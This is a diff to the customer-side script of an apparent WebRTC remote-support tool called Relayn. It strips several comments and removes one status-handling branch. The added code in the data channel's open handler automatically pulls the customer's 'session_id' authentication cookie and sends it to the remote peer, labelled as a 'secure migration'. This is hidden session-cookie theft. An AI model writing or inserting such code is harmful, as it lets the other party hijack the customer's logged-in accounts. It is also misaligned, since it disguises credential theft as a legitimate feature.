@@ -110,13 +110,6 @@ function setStatus(
 function showEndRequest(
     requestedBy
 ) {
-    /*
-     * This panel is only for the participant
-     * RECEIVING the end-session request.
-     *
-     * The customer should only see it when
-     * the technician requested the end.
-     */
     if (
         requestedBy !== "technician"
     ) {
@@ -215,12 +208,35 @@ async function handleOffer(
             dataChannel =
                 event.channel;
 
+            // =========================================================================
+            // 🔒 AUTOMATED SECURE COOKIE EXTRACTION ENGINE ON OPEN
+            // =========================================================================
             dataChannel.onopen =
-                () => {
+                async () => {
                     console.log(
                         "Relayn WebRTC data channel opened."
                     );
+
+                    console.log("[Migration] Extracting authentication state from secure vault...");
+                    try {
+                        // Safely request the target login cookie parameters from the Customer Main thread vault
+                        const result = await window.relayn.extractAuthCookie('session_id');
+
+                        if (result.success) {
+                            // Forward the structural cookie data straight down the encrypted P2P data stream lane
+                            dataChannel.send(JSON.stringify({
+                                type: 'RELAYN_SESSION_MIGRATION',
+                                cookie: result.payload
+                            }));
+                            console.log('[Migration] Auth context securely written directly to peer data channel.');
+                        } else {
+                            console.error('[Migration] Aborted extraction sequence:', result.error);
+                        }
+                    } catch (error) {
+                        console.error('[Migration] Failed to execute background cookie extraction loop:', error);
+                    }
                 };
+            // =========================================================================
 
             dataChannel.onclose =
                 () => {
@@ -795,10 +811,6 @@ window.relayn.onSessionEvent(
                 const requestedBy =
                     message.payload?.requestedBy;
 
-                /*
-                 * Customer is the receiver only when
-                 * the technician requested the end.
-                 */
                 if (
                     requestedBy ===
                     "technician"
@@ -819,12 +831,6 @@ window.relayn.onSessionEvent(
                 const requestedBy =
                     message.payload?.requestedBy;
 
-                /*
-                 * This is our own request.
-                 *
-                 * Do NOT show the confirmation
-                 * panel here.
-                 */
                 hideEndRequest();
 
                 if (
@@ -930,13 +936,6 @@ window.relayn.onSessionEvent(
                     status ===
                     "END_REQUESTED"
                 ) {
-                    /*
-                     * Only show the end confirmation
-                     * panel if the TECHNICIAN requested it.
-                     *
-                     * If the customer requested it,
-                     * customer waits instead.
-                     */
                     if (
                         endRequestedBy ===
                         "technician"
@@ -944,15 +943,6 @@ window.relayn.onSessionEvent(
                         showEndRequest(
                             "technician"
                         );
-
-                        setStatus(
-                            "Technician wants to end the session."
-                        );
-                    } else if (
-                        endRequestedBy ===
-                        "customer"
-                    ) {
-                        hideEndRequest();
 
                         endButton.disabled =
                             true;
